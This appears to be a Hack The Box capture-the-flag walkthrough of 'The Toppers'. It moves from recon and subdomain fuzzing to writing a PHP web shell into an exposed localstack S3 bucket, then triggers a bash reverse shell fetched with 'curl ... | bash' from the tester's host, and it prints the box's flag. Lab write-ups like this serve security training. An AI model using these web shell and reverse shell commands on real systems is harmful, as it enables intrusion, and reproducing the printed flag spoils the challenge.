# 🚀 Hack The Box Walkthrough: *The Toppers*  
> 🎯 Objective: Exploit a misconfigured S3-like service and execute a remote shell to retrieve the flag!

---

## 🔍 STEP 1 — Initial Recon with Nmap

Let's sweep the target for open ports and gather basic service info!

```bash
nmap -sV -sC 10.129.227.248
```

```
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Toppers
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

✅ **Port 80** hosts a webpage titled **"The Toppers"**. Let’s dig deeper...

---

## 🌐 STEP 2 — Subdomain Fuzzing with Wfuzz

Time to hunt for hidden subdomains using virtual host fuzzing!

```bash
wfuzz -c -w subdomains.txt -u 'http://thetoppers.htb/' -H "Host: FUZZ.thetoppers.htb" --hw 12
```

💥 Jackpot!

```
000000468:   404        0 L      2 W        21 Ch       "s3"
```

👀 We found a promising subdomain: **s3.thetoppers.htb**

---

## 💻 STEP 3 — Investigating the S3 Endpoint

```bash
curl -i http://s3.thetoppers.htb/
```

```
HTTP/1.1 404 
Date: Fri, 04 Jul 2025 01:28:40 GMT
Server: hypercorn-h11
Content-Type: text/html; charset=utf-8
Content-Length: 21
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH
Access-Control-Allow-Headers: authorization,cache-control,content-length,content-md5,content-type,etag,location,x-amz-acl,x-amz-content-sha256,x-amz-date,x-amz-request-id,x-amz-security-token,x-amz-tagging,x-amz-target,x-amz-user-agent,x-amz-version-id,x-amzn-requestid,x-localstack-target,amz-sdk-invocation-id,amz-sdk-request
Access-Control-Expose-Headers: etag,x-amz-version-id

{"status": "running"}
```

📦 Looks like a localstack S3 API running! Time to bring in the big guns — `awscli`.

---

## 🧰 STEP 4 — Install and Configure AWS CLI

```bash
sudo apt install awscli
aws configure
```

Enter dummy creds:

```
AWS Access Key ID [None]: temp
AWS Secret Access Key [None]: temp
```

Let’s list the buckets via custom endpoint:

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls
```

🎯 Output:

```
2025-07-03 21:14:47 thetoppers.htb
```

Now list the contents:

```bash
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

📂 Bucket contents:

```
                           PRE images/
2025-07-03 21:14:47          0 .htaccess
2025-07-03 21:14:47      11952 index.php
```

---

## 💣 STEP 5 — Uploading a PHP Webshell

Generate a simple web shell:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

✅ Confirmed upload:

```
upload: ./shell.php to s3://thetoppers.htb/shell.php
```

Now we can trigger commands via:

```bash
http://thetoppers.htb/shell.php?cmd=whoami
```

---

## 🕳️ STEP 6 — Remote Code Execution via Reverse Shell

Craft a reverse shell payload:

```bash
echo "bash -i >& /dev/tcp/10.10.14.123/4444 0>&1" > shell.sh
python3 -m http.server 8000
```

Set up a listener:

```bash
nc -lvnp 4444
```

Trigger the reverse shell:

```bash
curl "http://thetoppers.htb/shell.php?cmd=curl%2010.10.14.123:8000/shell.sh|bash"
```

🎉 SHELL OBTAINED!

---

## 🏁 STEP 7 — Flag Capture

Search for the flag:

```bash
locate flag.txt
```

Found:

```
/var/www/flag.txt
```

Read the flag:

```bash
cat /var/www/flag.txt
```

🔥 Final Flag:

```
a980d99281a28d638ac68b9bf9453c2b
```

---

# 💥 MISSION COMPLETE

We exploited a custom S3-like instance, uploaded a webshell, pulled off RCE, and snatched the flag like pros.

🧠 Lessons:
- Localstack emulated AWS services can be deadly when exposed
- Subdomain fuzzing remains OP
- PHP shells + curl = 👑

🏴‍☠️ Box rooted. Time to move on to the next target!
